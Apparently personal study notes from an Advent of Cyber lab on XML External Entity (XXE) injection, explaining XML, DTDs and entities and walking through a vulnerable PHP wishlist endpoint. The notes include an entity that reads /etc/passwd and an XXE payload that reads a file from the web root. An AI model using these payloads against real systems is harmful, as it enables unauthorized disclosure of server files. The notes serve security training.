
2024-12-10 14:57

Source: #AOC24 

Tags: [[Injection]]

### Extensible Markup Language (XML)

[[XML]] is a commonly used method to transport and store data in a structured format that is easy to understand.
XML uses `tags` to label and organize information
The key benefit of XML is that it is easily shareable and customizable, allowing you to create your own tags. 

```xml
<people>
	<name>Glitch</name>
	<address>Wareville</address>
</people>
```
### Document Type Definition (DTD)

DTD is a set of **rules** that defines the structure of an XML document.

```dtd
<!DOCTYPE people [ 
	<!ELEMENT people(name, address)> 
	<!ELEMENT name (#PCDATA)>
	<!ELEMENT address (#PCDATA)>
]>
```
### Entities

- Entities in XML are placeholders that allow the insertion of large chunks of data or referencing internal or external files. 
- Entities can be defined internally within the XML document or externally, referencing data from an outside source.

```xml
<!DOCTYPE people [
	<!ENTITY thmFile SYSTEM "file:///etc/passwd">
]>
<people>
	<name>Glitch</name> 
	<address>&thmFile;</address>
</people>
```
### XML External Entity (XXE)

- XXE is an attack that takes advantage of **how** **XML parsers handle external entities**.
- When a web application processes an XML file that contains an external entity, the parser attempts to load or execute whatever resource the entity points to. If necessary sanitization is not in place, the attacker may point the entity to any malicious source/code causing the undesired behavior of the web app.
### Lab

we can wish list items and it assigns a wish number to every wish list 
Now, when you visit the URL, `http://MACHINE_IP/product.php`, and click `Add to Wishlist`, an AJAX call is made to `wishlist.php`

This `wishlist.php` accepts the request and parses the request using the following code:

```javascript
<?php
..
...
libxml_disable_entity_loader(false);
$wishlist = simplexml_load_string($xml_data, "SimpleXMLElement", LIBXML_NOENT);

...
..
echo "Item added to your wishlist successfully.";
?>

```

When a user sends specially crafted XML data to the application, the line `libxml_disable_entity_loader(false)` allows the XML parser to load external entities. This means the XML input can include external file references or requests to remote servers. When the XML is processed by `simplexml_load_string` with the `LIBXML_NOENT` option, the web app resolves external entities, allowing 

inject this payload in the `wishlists.php` request 
**Note: Not all web applications use the path /var/www/html, but web servers typically use it.**

```javascript
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_1.txt"> ]>
<wishlist>
	<user_id>1</user_id>
	<item>
	       <product_id>&payload;</product_id>
	</item>
</wishlist>
```

### References
DAY 5 